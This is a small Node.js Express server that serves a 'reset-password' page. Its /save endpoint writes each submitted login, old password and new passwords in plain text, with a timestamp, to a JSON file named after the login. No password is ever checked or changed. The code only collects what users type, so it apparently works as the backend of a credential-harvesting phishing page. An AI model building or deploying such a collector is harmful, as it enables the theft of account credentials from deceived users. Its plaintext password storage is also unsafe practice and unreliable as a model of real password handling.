const fs = require("fs");
const path = require("path");
const express = require("express");

const app = express();
app.use(express.json());
app.use(express.static("public"));

const usersDir = path.join(__dirname, "users");
if (!fs.existsSync(usersDir)) {
    fs.mkdirSync(usersDir);
}

app.get("/reset-password", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "reset-password.html"));
});

app.post("/save", (req, res) => {
    const { login, oldPassword, newPassword, newPassword2 } = req.body;

    // имя файла — по логину/input1 (очисти от опасных символов)
    const safeName = String(login || "unknown").replace(/[<>:"/\\|?*]/g, "_");
    const filePath = path.join(usersDir, `${safeName}.json`);

    const now = new Date();
    const date =
        now.toLocaleString("ru-RU", {
            day: "2-digit",
            month: "2-digit",
            year: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
        });

    fs.writeFileSync(
        filePath,
        JSON.stringify({ login, oldPassword, newPassword, newPassword2, date: date }, null, 2)
    );

    res.json({ ok: true });
});

app.listen(3000, () => console.log("http://localhost:3000"));